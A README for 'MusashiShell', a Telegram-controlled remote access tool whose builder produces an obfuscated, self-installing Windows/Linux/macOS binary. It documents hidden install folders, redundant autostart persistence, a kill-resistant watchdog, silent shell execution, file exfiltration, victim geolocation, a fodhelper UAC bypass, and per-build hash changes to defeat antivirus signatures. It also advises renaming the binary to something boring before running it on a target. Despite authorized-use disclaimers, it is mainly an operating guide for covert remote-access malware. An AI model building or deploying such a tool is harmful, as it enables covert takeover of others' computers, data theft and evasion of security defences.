# MusashiShell

Telegram-controlled remote administration client + binary builder. Configure once, get a self-installing `.exe` that reports back to your Telegram and accepts shell commands.

> ⚠️ **Authorized use only.** For systems you own or have written permission to administer. Unauthorized access is illegal.

---

## What it is

- **Builder** (`builder.py`) — interactive CLI. Takes a bot token, an **admin roster** (id + role), client name, app name; generates and compiles a single-file binary.
- **Template** (`resources/template.py`) — the client itself. Self-installs into a hidden folder, registers in OS autostart in multiple places, connects to Telegram, runs shell commands from the baked-in admins.

**Target OS support:** Windows, Linux, macOS.

---

## Admins are baked in at build time

**The admin roster is fixed when you compile the binary.** There is no `/addadmin`, no `/deladmin`, no runtime editing. To change who can control a client you rebuild it and redeliver.

Each admin has a **role**:

| Role | Rank | What they can do |
|---|---|---|
| `op`    | 1 | `/start`, `/help`, `/admins`, `/heartbeat`, `/getfile` |
| `admin` | 2 | everything `op` can, plus `/cmd`, `/powershell`, `/uac`, `/putfile`, `/uninstall`, and raw shell fallback |
| `super` | 3 | everything `admin` can, plus receives watchdog alerts (process died / respawned) |

The **first `super`** in the roster is the "primary admin" — it's the `chat_id` the internal watchdog uses for its out-of-band alerts, so it must always be present.

Roles hierarchy: `op` < `admin` < `super`. Every handler checks the rank and silently drops anything below.

---

## Requirements

**Build machine:**
```bash
pip install -r requirements.txt
```

**Target machine:** nothing. The binary is self-contained.

**Python:** 3.10+.

> PyInstaller cannot cross-compile. Build on Windows for a `.exe`, on Linux for ELF, on macOS for Mach-O.

---

## Quick start

```bash
# 1. Install dependencies
pip install -r requirements.txt

# 2. Run builder
python builder.py

# 3. Choose [1], enter:
#    - Bot token    (from @BotFather)
#    - Client name  (e.g. "BOT Charlie")
#    - App name     (exe / task / registry / unit, default: SystemEvents)
#
#    Then add admins one by one:
#      user_id: 8897782929
#      role for 8897782929 (op/admin/super) [admin]: super
#      user_id: 123456789
#      role for 123456789 (op/admin/super) [admin]: admin
#      user_id:            <-- blank to finish
#
#    At least one 'super' is mandatory.

# 4. Wait ~2-3 min. Binary appears at:
#    build/<slug>/dist/<slug>_obf.exe

# 5. Rename it to something boring, copy to target, run.
#    The primary super will receive "🟢 [NAME] ONLINE!"

# NOTE!!! After creating the bot token, send the bot a /start message
#         from the primary admin account so it can DM you.
```

---

## Builder menu

| # | Action |
|---|---|
| 1 | Set config (incl. admins) and build everything automatically |
| 2 | Rebuild `.exe` only (skips if nothing changed) |
| 3 | Regenerate `client.py` + `client_obf.py` |
| 4 | Show current settings + roster |
| 5 | List built clients |
| 6 | Clean `build/` |
| 7 | Open log file |
| 0 | Exit |

Config is saved in `cfg/builder.conf`. Logs rotate in `logs/builder.log`.

`builder.conf` format:

```json
{
  "token": "8897782929:AAHyP-...",
  "admins": {
    "8897782929": "super",
    "123456789":  "admin"
  },
  "name": "BOT Charlie",
  "app_name": "SystemEvents"
}
```

To change the roster, run option 1 again, edit the list, and rebuild.

---

## Bot commands

All commands are gated by role. Anything above your rank is silently dropped (no reply, no error).

| Command | Min role | Action |
|---|---|---|
| `/start` | `op` | Host info + geolocation |
| `/help` | `op` | Command list, shows your own role |
| `/admins` | `op` | Lists every baked-in admin and their role |
| `/heartbeat` | `op` | Liveness: uptime, PID, offline flag |
| `/getfile <path>` | `admin` | Download a file from target (≤ 50 MB) |
| `/putfile <dir>` | `admin` | Upload a file from Telegram into `<dir>` |
| `/cmd <command>` | `admin` | Run via `cmd.exe /c` (Win) or `sh` (Unix) |
| `/powershell <command>` | `admin` | Run via PowerShell (Windows only) |
| `/uac <command>` | `admin` | Run with high integrity via UAC bypass (Windows only) |
| `/uninstall` | `admin` | Self-destruct with inline confirmation |
| *any text* | `admin` | Shell command (no timeout, output chunked at 3500 chars) |

Examples:
```
dir
ps aux | head -20
netstat -an | findstr LISTEN
/cmd whoami /priv
/powershell Get-Process | Select -First 5
/uac whoami /groups
```

---

## UAC bypass (Windows)

`/uac <command>` elevates a **filtered administrator token** to a **high-integrity token** without prompting the user. It hijacks the `ms-settings` registry key (which `fodhelper.exe` reads on launch) and spawns the auto-elevating `fodhelper.exe`.

**Preconditions:**
- You're a member of `Administrators`.
- UAC is at the default level (not "Always notify").
- Windows 10 or 11.

**Not a privilege escalation.** If the user isn't an admin, `/uac` does nothing — it only elevates an already-admin token.

The client writes the payload's stdout/stderr to a temp file and reads it back, because the elevated process runs in a separate session.

---

## Where the client installs itself

| OS | Elevated | Regular user |
|---|---|---|
| Windows | `C:\ProgramData\.<rand>\` + `schtasks` ONLOGON/ONSTART/ONIDLE as SYSTEM + ProgramData Startup folder | `%LOCALAPPDATA%\.<rand>\` + `HKCU\...\Run` + `RunOnce` + user Startup folder |
| Linux | `/opt/.<rand>/` + systemd unit (Restart=always) | `~/.local/share/.<rand>/` + XDG autostart + `.bashrc`/`.zshrc`/`.profile` |
| macOS | `/Library/Application Support/.<rand>/` + LaunchDaemon (KeepAlive) | `~/Library/Application Support/.<rand>/` + LaunchAgent + `.zshrc` |

On Windows, folder and file get `HIDDEN + SYSTEM` attributes.

**Redundancy on install:**
- A `.bak` copy sits next to the main file. The Windows `.vbs` launcher restores from `.bak` if the main file is missing.
- A second hidden folder with another copy of the payload. The runtime watchdog re-runs `autostart_install()` if the launcher disappears.

**Install marker** (prevents duplicate copies; uses APP_NAME, default `SystemEvents`):
- Windows: `HKCU\Software\<APP_NAME>\LaunchPath`
- Unix: `~/.config/<APP_NAME>/install_path`

---

## Watchdog

On every start, a separate detached process (`.wd_<rand>.py`) is spawned:

- Polls the parent PID every 2 s.
- If the parent dies **without** a `.clean_exit` marker → sends `🔴 [NAME] died - respawning` (rate-limited to once per 5 min) and re-launches the client via its launcher.
- If the parent died with `.clean_exit` (graceful SIGINT/SIGTERM/console event/`/uninstall`) → exits silently.
- Writes its own PID to `~/.config/<APP_NAME>/watchdog.pid` so the parent can kill it on `/uninstall`.
- Launched with `DETACHED_PROCESS | CREATE_BREAKAWAY_FROM_JOB` on Windows, `start_new_session=True` on Unix — survives `taskkill /T /F` and process-group kills.

The main process runs `watchdog_check_loop()` every 60 s: if the watchdog PID is dead or the launcher file is missing, it re-spawns both.

**Not available when frozen with PyInstaller.** A frozen build has no plain Python interpreter to run `.wd_*.py`. If you need the watchdog in an exe, ship a second small exe alongside.

---

## Elevated install (Windows)

1. Right-click the renamed `.exe` → **Run as administrator**.
2. Accept the UAC prompt once.
3. Client re-installs to `ProgramData`, creates a `SYSTEM` scheduled task (ONLOGON, ONSTART, ONIDLE), plus a ProgramData Startup entry.
4. Every reboot from now on: silent start, highest privileges, no UAC.

---

## Uninstall

Two ways: manual (below) or via Telegram — send `/uninstall`, confirm with inline **Yes**. The client kills its watchdog, removes every autostart entry it ever created, drops a `.clean_exit` marker (so the watchdog stays quiet), and deletes its own folder via a detached helper.

Manual removal — kill the process first:
```
taskkill /F /IM <APP_NAME>.exe /T
```

**Windows (elevated)** — replace `<APP_NAME>` with your app name (default `SystemEvents`):
```
for %s in (ONLOGON ONSTART ONIDLE) do schtasks /Delete /TN <APP_NAME>_%s /F
schtasks /Delete /TN <APP_NAME> /F
reg delete "HKCU\Software\<APP_NAME>" /f
reg delete "HKLM\Software\<APP_NAME>" /f
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v <APP_NAME> /f
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v <APP_NAME> /f
reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v <APP_NAME> /f
```

**Linux (root):**
```bash
systemctl disable --now <APP_NAME>.service
rm -f /etc/systemd/system/<APP_NAME>.service
rm -rf /opt/.<rand>
rm -f ~/.config/autostart/<APP_NAME>.desktop
rm -f ~/.config/<APP_NAME>/install_path
# also remove the "# <APP_NAME>-autostart" block from ~/.bashrc / ~/.zshrc / ~/.profile
```

**macOS (root):**
```bash
launchctl unload -w /Library/LaunchDaemons/com.<APP_NAME>.plist
rm -f /Library/LaunchDaemons/com.<APP_NAME>.plist
rm -f ~/Library/LaunchAgents/com.<APP_NAME>.plist
rm -rf "/Library/Application Support/.<rand>"
```

---

## Directory layout

```
MusashiShell/
├── builder.py              # interactive builder
├── pyproject.toml
├── requirements.txt
├── README.md
├── LICENSE
├── resources/
│   ├── template.py         # client source with __PLACEHOLDERS__
│   └── app.ico             # optional Windows icon
├── cfg/
│   └── builder.conf        # auto-created; last used config incl. roster
├── logs/
│   └── builder.log         # auto-created; rotating, 5×5 MB
└── build/
    └── <slug>/
        ├── client.py       # substituted source
        ├── client_obf.py   # obfuscated (single line)
        ├── dist/
        │   └── <slug>_obf.exe
        ├── work/
        └── .sig_obf.json   # cache signature
```

`<slug>` is derived from the client name: spaces → `_`, non-alphanumerics stripped. E.g. `BOT Charlie` → `BOT_Charlie`.

---

## Under the hood

- **Secrets baked in.** Token and admin roster are base64-encoded inside `client.py`:
  - `__TOKEN__` → base64 of the bot token.
  - `__ADMINS__` → base64 of a compact JSON object: `{"8897782929":"super","123456789":"admin"}`.
  This is obfuscation, not encryption. Anyone with the binary can decode in one line.
- **Every build is byte-unique.** Three random letter/digit comments are injected at the top of `client.py` before obfuscation, so the payload and the final binary hash differ between builds. This defeats naive signature matching by hash.
- **Obfuscated payload is a single line.** `client_obf.py` contains only `_=lambda __:exec(__import__('gzip')...)` — no visible imports. All module inclusions are declared via PyInstaller's `--hidden-import` and `--collect-submodules` in `builder.py`.
- **Obfuscation layers.** gzip → lzma → zlib → base64 → reversed string. Unpacked at runtime by a lambda `exec()`.
- **Output encoding.** `cmd.exe` built-ins write in the OEM codepage (cp866 on Russian Windows, cp437 on US, cp932 on Japanese, ...) when stdout is a pipe. The client tries UTF-8 first, then falls back to the OEM codepage. This is why `dir` output is readable text, not `????`.
- **Monospace output.** Every reply is wrapped in `<pre>...</pre>` after HTML-escaping `& < >` — Telegram renders it monospaced with a one-tap copy button. `ParseMode.HTML` is chosen over MarkdownV2 because it only needs three characters escaped, vs ~18 in MarkdownV2.
- **No console windows.** Every subprocess call on Windows uses `CREATE_NO_WINDOW`. The client is built with `--noconsole`. Nothing flashes when commands run.
- **Connection tracking.** The client notifies the primary super once on first connection loss, stays silent for subsequent failures, and sends "back online" (with fresh device info) when the loop survives 3 s without raising.
- **Shutdown notifications.** `SIGINT` / `SIGTERM` / `SIGBREAK` handlers plus an `atexit` backstop send exactly one "shutting down" message per process. Windows console events (`CTRL_CLOSE_EVENT`, `CTRL_LOGOFF_EVENT`, `CTRL_SHUTDOWN_EVENT`) are caught via `SetConsoleCtrlHandler` — those don't go through `signal.signal`.
- **Clean-exit marker.** On every graceful exit, the client drops `~/.config/<APP_NAME>/.clean_exit`. The watchdog checks that file before alerting, so you never get a duplicate "died" message after a legitimate shutdown or `/uninstall`.
- **Watchdog rate limit.** Even if the parent keeps crash-looping, you get at most one `🔴 died - respawning` per 5 minutes (`.notify_ts` in the config dir).
- **Stealth for strangers.** Non-admin messages get no reply at all — no "access denied", nothing. The bot silently ignores anyone not in the baked-in roster.
- **Geolocation cache.** Nine fallback geo-IP APIs are queried once per process; the result is cached in `_geo_cache` and reused for `/start` and every "back online" message.
- **Bot conflict handling.** `TelegramConflictError` (same token polled from two machines) is treated as fatal — the client notifies and exits, so a stale instance doesn't keep fighting a new one.

---

## Troubleshooting

| Symptom | Fix |
|---|---|
| No "ONLINE" in Telegram | Check token; check that at least one `super` exists; check internet; check AV quarantine |
| `Token already in use` | Another instance is running with the same token — kill it |
| `/cmd` or `/uac` silently does nothing | Your user's role is below `admin` — check `/admins`; if you need it, rebuild with `admin` or `super` |
| `/uac` returns "not an admin" | You're running as a regular user, not a filtered admin. UAC bypass only elevates a filtered admin token to high. |
| `/uac` returns "attempted" but nothing happened | UAC is on "Always notify", or the target Windows build patched `fodhelper.exe`. Try `computerdefaults.exe` by editing `ub()`'s `ln` param. |
| Build fails on `*.pyd` `WinError 5` | Running client holds the DLL — `taskkill`, then rebuild |
| `dir` output is `????` | Old build — current one decodes OEM codepage correctly |
| Terminal broken after resize | Use Windows Terminal, not old cmd/conhost |
| Duplicate copies in new folders | Install marker broken — check registry / marker file |
| `ModuleNotFoundError: No module named 'X'` | Add `X` to the `HIDDEN` list in `builder.build_exe` and rebuild |
| PyInstaller says `pyinstaller not found` | `pip install pyinstaller`, or add Python's Scripts dir to `PATH` |
| Watchdog never fires | Frozen exe can't run `.wd_*.py`. Build without PyInstaller, or ship a second small exe as watchdog. |
| Watchdog fires right after Ctrl+C | Check that `.clean_exit` exists in `~/.config/<APP_NAME>/`. If not, the signal didn't reach the handler. |

---

## Security notes

- **Bot token is a single point of failure.** Anyone with it controls every client. Rotate via @BotFather if leaked.
- **The admin roster is only as strong as the binary.** Anyone who extracts the binary can decode the roster. Don't distribute builds outside your org.
- **AV may flag it** — self-copy + autostart + obfuscated payload + watchdog = textbook RAT signature. Add exclusions on your own machines.
- **Never install on machines you don't own.**
- **`/uac` doesn't work if you're not already an admin.** It's UAC bypass, not privilege escalation.
- **No built-in HMAC.** If someone gets your token, they can replay every command. Consider adding an HMAC signature layer if the token may travel over untrusted channels.

---

## License

GPL-3.0-or-later. See `LICENSE`.

---

## Legal

Provided for authorized security testing, red team engagements, and administration of systems you own. No liability for misuse. If you don't have **written permission**, don't install it.